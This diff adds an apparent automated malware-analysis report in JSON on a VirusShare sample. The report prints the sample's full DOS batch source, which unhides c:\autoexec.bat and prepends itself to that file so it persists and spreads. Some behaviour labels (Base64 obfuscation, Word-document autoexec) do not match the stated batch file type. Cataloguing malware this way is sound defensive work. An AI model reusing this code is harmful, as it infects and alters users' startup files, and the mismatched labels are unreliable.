@@ -1,0 +1,43 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "autoexec": "Runs when the Word document is opened"
+        },
+        "macro": "@echo off %inst%\nrem bomb hbbginst\ntype %0 |find /V \"inst\"  >c:\\inst.cfg\nattrib c:\\autoexec.bat -h -r -s %inst%\ntype c:\\autoexec.bat >c:\\hbbginst.cfg \ncopy /B c:\\inst.cfg+c:\\hbbginst.cfg c:\\autoexec.bat >nul\ndel c:\\hbbginst.cfg >nul \ndel c:\\inst.cfg >nul\ngoto end %inst%"
+    },
+    "filename": "VirusShare_04b046543a59c9be900451a45de80b6c",
+    "filesize": 280,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "04b046543a59c9be900451a45de80b6c",
+        "sha1": "92f62173d26e3eb185e04af4510132bd7834052f",
+        "sha256": "cbcb6edc291d2885e7b7b2731f576853fa9ee4c0bf711a38f947a15e88852312"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off %inst%",
+            "rem bomb hbbginst",
+            "type %0 |find /V \"inst\"  >c:\\inst.cfg",
+            "attrib c:\\autoexec.bat -h -r -s %inst%",
+            "type c:\\autoexec.bat >c:\\hbbginst.cfg ",
+            "copy /B c:\\inst.cfg+c:\\hbbginst.cfg c:\\autoexec.bat >nul",
+            "del c:\\hbbginst.cfg >nul ",
+            "del c:\\inst.cfg >nul",
+            "goto end %inst%"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.259614",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
